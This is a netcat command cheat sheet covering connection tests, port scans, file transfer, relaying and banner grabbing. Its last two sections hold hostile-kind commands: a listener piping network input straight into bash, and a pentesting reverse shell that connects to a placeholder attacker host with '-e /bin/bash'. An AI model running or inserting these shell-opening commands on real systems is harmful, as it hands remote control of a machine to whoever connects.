---
title: "Netcat (nc) Network Swiss Army Knife"
description: "Test TCP/UDP connections, port scanning, and data transfer with netcat."
date: "2025-09-22"
tags: ["netcat", "networking", "debugging"]
category: "Network"
---

## Test TCP connection

```bash
nc -zv example.com 80
```

## Scan port range

```bash
nc -zv example.com 20-30
```

## Listen on port (server mode)

```bash
nc -l 8080
```

## Connect to listening port

```bash
nc localhost 8080
```

## Chat between two machines

**Machine 1 (server):**

```bash
nc -l 9999
```

**Machine 2 (client):**

```bash
nc machine1-ip 9999
```

## Transfer file

**Receiver (server):**

```bash
nc -l 5000 > received_file.txt
```

**Sender:**

```bash
nc receiver-ip 5000 < file.txt
```

## Create simple web server

```bash
while true; do echo -e "HTTP/1.1 200 OK\n\nHello World" | nc -l 8080; done
```

## UDP mode

```bash
nc -u example.com 53
```

## Set timeout

```bash
nc -w 3 example.com 80
```

## Verbose output

```bash
nc -v example.com 80
```

## Keep listening after disconnect

```bash
nc -k -l 8080
```

## Banner grabbing

```bash
echo "" | nc example.com 22
```

## Port forwarding/relay

```bash
nc -l 8080 | nc target-server 80
```

## Check if port is open

```bash
nc -zv 192.168.1.1 22 && echo "Open" || echo "Closed"
```

## Test HTTP endpoint

```bash
printf "GET / HTTP/1.0\r\n\r\n" | nc example.com 80
```

## Pipe commands through network

**Server:**

```bash
nc -l 9999 | bash
```

**Client:**

```bash
echo "ls -la" | nc server-ip 9999
```

## Netcat as reverse shell (for pentesting)

**Attacker (listener):**

```bash
nc -lvp 4444
```

**Target:**

```bash
nc attacker-ip 4444 -e /bin/bash
```
